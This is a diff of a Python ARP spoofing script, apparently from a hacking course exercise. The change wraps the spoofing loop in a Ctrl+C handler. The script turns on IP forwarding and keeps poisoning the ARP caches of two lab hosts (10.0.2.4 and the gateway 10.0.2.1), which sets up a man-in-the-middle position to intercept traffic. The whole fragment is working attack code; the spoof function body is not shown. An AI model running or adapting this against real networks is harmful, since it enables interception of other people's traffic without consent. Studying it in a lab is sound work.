@@ -21,13 +21,17 @@ def spoof(target_ip, spoof_ip):
 os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
 
 sent_packets_count = 0
-while True:
-    spoof("10.0.2.4", "10.0.2.1")
-    spoof("10.0.2.1", "10.0.2.4")
-    sent_packets_count = sent_packets_count + 2
-    #the comma adds stuff to the buffer and not adding a new line
-    #and printing as a dynamic counter
-    print("\r[+] Packets sent:" + str (sent_packets_count)),
-    #flush the buffer
-    sys.stdout.flush()
-    time.sleep(2)
+
+try:
+    while True:
+        spoof("10.0.2.4", "10.0.2.1")
+        spoof("10.0.2.1", "10.0.2.4")
+        sent_packets_count = sent_packets_count + 2
+        #the comma adds stuff to the buffer and not adding a new line
+        #and printing as a dynamic counter
+        print("\r[+] Packets sent:" + str (sent_packets_count)),
+        #flush the buffer
+        sys.stdout.flush()
+        time.sleep(2)
+except KeyboardInterrupt:
+        print("[+] Detected CTRL + C ............ Quitting.")
